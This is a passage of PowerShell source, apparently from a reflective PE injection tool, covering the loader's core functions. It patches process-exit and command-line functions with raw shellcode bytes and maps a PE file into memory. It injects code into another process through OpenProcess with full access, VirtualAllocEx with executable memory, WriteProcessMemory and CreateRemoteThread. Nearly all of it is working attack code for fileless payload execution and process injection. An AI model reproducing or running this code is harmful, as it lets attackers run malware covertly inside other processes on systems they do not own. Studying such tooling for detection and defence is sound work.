		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw ""Call to VirtualProtect failed""
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		
		
		
		
		
		
		$DllList = @(""msvcr70d.dll"", ""msvcr71d.dll"", ""msvcr80d.dll"", ""msvcr90d.dll"", ""msvcr100d.dll"", ""msvcr110d.dll"", ""msvcr70.dll"" `
			, ""msvcr71.dll"", ""msvcr80.dll"", ""msvcr90.dll"", ""msvcr100.dll"", ""msvcr110.dll"")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, ""_wcmdln"")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, ""_acmdln"")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					""Error, couldn't find _wcmdln or _acmdln""
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw ""Call to VirtualProtect failed""
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw ""Call to VirtualProtect failed""
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		
		
		
		
		

		$ReturnArray = @()
		$ExitFunctions = @() 
		
		
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke(""mscoree.dll"")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw ""mscoree handle null""
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, ""CorExitProcess"")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw ""CorExitProcess address not found""
		}
		$ExitFunctions += $CorExitProcessAddr
		
		
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""ExitProcess"")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw ""ExitProcess address not found""
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			
			
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""ExitThread"")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw ""ExitThread address not found""
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw ""Call to VirtualProtect failed""
			}
			
			
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			
			
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		

		Write-Output $ReturnArray
	}
	
	
	
	
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw ""Call to VirtualProtect failed""
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	
	
	
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				
				
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		
		Write-Verbose ""Getting basic PE information from the file""
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning ""PE is not compatible with DEP, might cause issues"" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(""kernel32.dll"")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""IsWow64Process"")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw ""Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit""
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw ""Call to IsWow64Process failed""
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw ""PowerShell must be same architecture (x86/x64) as PE being loaded and remote process""
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw ""PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)""
		}
		

		
		Write-Verbose ""Allocating memory for the PE and write its headers to memory""
		
        
		[IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $ForceASLR) -and (-not $PESupportsASLR))
		{
			Write-Warning ""PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)"" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose ""PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash.""
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error ""Cannot use ForceASLR when loading in to a remote process."" -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error ""PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process"" -ErrorAction Stop
        }

		$PEHandle = [IntPtr]::Zero				
		$EffectivePEHandle = [IntPtr]::Zero		
		if ($RemoteLoading -eq $true)
		{
			
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw ""Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use""
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw ""VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free).""
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		
		Write-Verbose ""Getting detailed PE information from the headers loaded in memory""
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose ""StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)""
		
		
		
		Write-Verbose ""Copy PE sections in to memory""
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		
		Write-Verbose ""Update memory addresses based on where the PE was actually loaded in memory""
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		
		Write-Verbose ""Import DLL's needed by the PE we are loading""
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose ""Update memory protection flags""
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose ""PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute""
			}
		}
		else
		{
			Write-Verbose ""PE being loaded in to a remote process, not adjusting memory permissions""
		}
		
		
		
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw ""Unable to write shellcode to remote process memory.""
			}
		}
		
		
		
		if ($PEInfo.FileType -ieq ""DLL"")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose ""Calling dllmain so the DLL knows it has been loaded""
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw ""Unable to allocate memory in the remote process for shellcode""
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw ""Unable to write shellcode to remote process memory.""
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw ""Call to CreateRemoteThread to call GetProcAddress failed.""
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq ""EXE"")
		{
			
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			
			
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose ""Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in.""

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose ""EXE thread has completed.""
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose ""Done unloading the libraries needed by the PE""
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning ""Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways"" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning ""Unable to free library: $ImportDllPath. Continuing anyways."" -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		
		Write-Verbose ""Calling dllmain so the DLL knows it is being unloaded""
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning ""Unable to call VirtualFree on the PE's memory. Continuing anyways."" -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne """"))
		{
			Throw ""Can't supply a ProcId and ProcName, choose one or the other""
		}
		elseif ($ProcName -ne $null -and $ProcName -ne """")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw ""Can't find process $ProcName""
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw ""More than one instance of $ProcName found, please specify the process ID to inject in to.""
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		
		





		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw ""Couldn't obtain the handle for process ID: $ProcId""
			}
			
			Write-Verbose ""Got the handle for the remote process to inject in to""
		}
		

		
		Write-Verbose ""Calling Invoke-MemoryLoadLibrary""
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw ""Unable to load PE, handle returned is NULL""
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] 
		
		
		
